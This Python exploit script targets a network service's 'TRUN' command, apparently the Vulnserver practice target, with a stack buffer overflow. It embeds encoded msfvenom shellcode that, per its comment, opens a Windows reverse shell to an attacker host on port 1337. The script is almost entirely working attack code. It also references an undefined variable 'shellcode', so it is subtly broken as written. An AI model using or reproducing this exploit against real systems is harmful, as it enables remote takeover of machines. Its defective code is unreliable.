#!/usr/bin/env python
# by Eduardo Barbosa (anakein)
#date: 2018-12-27

import socket as so
import sys
import struct

try:
    server = str(sys.argv[1])
    port   = int(sys.argv[2])

except IndexError:
    print("Usage: python %s 10.0.1.122 6666" % sys.argv[0])
    sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)

crash = 4400
offset = 2003

#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.103 LPORT=1337 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c EXITFUNC=thread
# 351 bytes
buf = 'TRUN '
buf += '.'+'\x90'*3
buf += '\x41'*offset
buf += struct.pack("<L", 0x625011af)
buf += '\x90'*19
buf += "\xd9\xc4\xbd\xbc\xd8\x24\xb1\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x52\x31\x6a\x17\x83\xea\xfc\x03\xd6\xcb\xc6"
buf += "\x44\xda\x04\x84\xa7\x22\xd5\xe9\x2e\xc7\xe4\x29\x54"
buf += "\x8c\x57\x9a\x1e\xc0\x5b\x51\x72\xf0\xe8\x17\x5b\xf7"
buf += "\x59\x9d\xbd\x36\x59\x8e\xfe\x59\xd9\xcd\xd2\xb9\xe0"
buf += "\x1d\x27\xb8\x25\x43\xca\xe8\xfe\x0f\x79\x1c\x8a\x5a"
buf += "\x42\x97\xc0\x4b\xc2\x44\x90\x6a\xe3\xdb\xaa\x34\x23"
buf += "\xda\x7f\x4d\x6a\xc4\x9c\x68\x24\x7f\x56\x06\xb7\xa9"
buf += "\xa6\xe7\x14\x94\x06\x1a\x64\xd1\xa1\xc5\x13\x2b\xd2"
buf += "\x78\x24\xe8\xa8\xa6\xa1\xea\x0b\x2c\x11\xd6\xaa\xe1"
buf += "\xc4\x9d\xa1\x4e\x82\xf9\xa5\x51\x47\x72\xd1\xda\x66"
buf += "\x54\x53\x98\x4c\x70\x3f\x7a\xec\x21\xe5\x2d\x11\x31"
buf += "\x46\x91\xb7\x3a\x6b\xc6\xc5\x61\xe4\x2b\xe4\x99\xf4"
buf += "\x23\x7f\xea\xc6\xec\x2b\x64\x6b\x64\xf2\x73\x8c\x5f"
buf += "\x42\xeb\x73\x60\xb3\x22\xb0\x34\xe3\x5c\x11\x35\x68"
buf += "\x9c\x9e\xe0\x3f\xcc\x30\x5b\x80\xbc\xf0\x0b\x68\xd6"
buf += "\xfe\x74\x88\xd9\xd4\x1c\x23\x20\xbf\x28\xb4\x2b\x58"
buf += "\x45\xb6\x2b\xa3\xac\x3f\xcd\xc1\xde\x69\x46\x7e\x46"
buf += "\x30\x1c\x1f\x87\xee\x59\x1f\x03\x1d\x9e\xee\xe4\x68"
buf += "\x8c\x87\x04\x27\xee\x0e\x1a\x9d\x86\xcd\x89\x7a\x56"
buf += "\x9b\xb1\xd4\x01\xcc\x04\x2d\xc7\xe0\x3f\x87\xf5\xf8"
buf += "\xa6\xe0\xbd\x26\x1b\xee\x3c\xaa\x27\xd4\x2e\x72\xa7"
buf += "\x50\x1a\x2a\xfe\x0e\xf4\x8c\xa8\xe0\xae\x46\x06\xab"
buf += "\x26\x1e\x64\x6c\x30\x1f\xa1\x1a\xdc\xae\x1c\x5b\xe3"
buf += "\x1f\xc9\x6b\x9c\x7d\x69\x93\x77\xc6\x89\x76\x5d\x33"
buf += "\x22\x2f\x34\xfe\x2f\xd0\xe3\x3d\x56\x53\x01\xbe\xad"
buf += "\x4b\x60\xbb\xea\xcb\x99\xb1\x63\xbe\x9d\x66\x83\xeb"
buf += shellcode
buf += "C"*(4400 - offset - 4 - 351 - 19)

buffer = buf

print("[+] Connecting to host ")
s.connect((server, port))
data = s.recv(1024)
print(data)
s.send('HELP ')
s.send(buffer)
s.recv(1024)
s.close()
